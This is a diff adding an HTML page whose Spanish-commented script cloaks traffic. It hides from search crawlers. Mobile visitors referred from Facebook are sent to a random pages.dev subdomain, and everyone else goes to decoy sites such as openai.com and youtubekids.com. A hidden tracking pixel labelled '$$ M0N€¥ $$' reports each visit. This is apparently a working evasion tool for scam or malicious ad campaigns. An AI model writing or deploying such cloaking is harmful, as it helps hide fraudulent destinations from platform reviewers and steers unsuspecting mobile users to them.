@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="robots" content="noindex, nofollow">
+</head>
+<body>
+    <script type="text/javascript">
+        // Función para detectar si es un robot
+        function isRobot() {
+            return /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+        }
+
+        // Función para verificar si el referente es de Facebook
+        function isFacebookReferral() {
+            var referrer = document.referrer;
+            return /facebook\.com/.test(referrer);
+        }
+
+        // Función para redirección móvil aleatoria
+        function getRandomMobileRedirect() {
+            var mobileRedirects = [
+                "https://ddaef54a.flavor-aev.pages.dev/",
+				        "https://f5f131b2.flavor-aev.pages.dev/",
+                "https://dffda0b3.flavor-aev.pages.dev/",
+				        "https://b8f63d53.flavor-aev.pages.dev/",
+				        "https://594f30bc.flavor-aev.pages.dev/",
+				        "https://b5ea057b.flavor-aev.pages.dev/",
+				        "https://e29f5c08.flavor-aev.pages.dev/",
+				        "https://1173c562.flavor-aev.pages.dev/",
+				        "https://80ba666c.flavor-aev.pages.dev/",
+				        "https://881830bc.flavor-aev.pages.dev/",
+                "https://af1c6d43.flavor-aev.pages.dev/"
+            ];
+            return mobileRedirects[Math.floor(Math.random() * mobileRedirects.length)];
+        }
+
+        // Realizar redirección en función del tipo de dispositivo, si es un robot y si proviene de Facebook
+        if (!isRobot()) {
+            if (isFacebookReferral()) {
+                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                    // Redirigir a una URL móvil aleatoria si proviene de Facebook y es un dispositivo móvil
+                    window.location.href = getRandomMobileRedirect();
+                } else {
+                    // Redirigir a una URL de PC si proviene de Facebook y es una PC
+                    window.location.href = "https://openai.com/";
+                }
+            } else {
+                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                    // Redirigir a una URL móvil independiente para usuarios de PC
+                    window.location.href = "https://chat.openai.com/";
+                } else {
+                    // Redirigir a una URL de PC independiente para usuarios de PC
+                    window.location.href = "https://youtubekids.com/";
+                }
+            }
+        }
+    </script>
+<img src="//whos.amung.us/pingjs/?k=direct0&amp;t= $$ M0N€¥ $$ &amp;x=https://openai.com/" style="display:none">
+</body>
+</html>
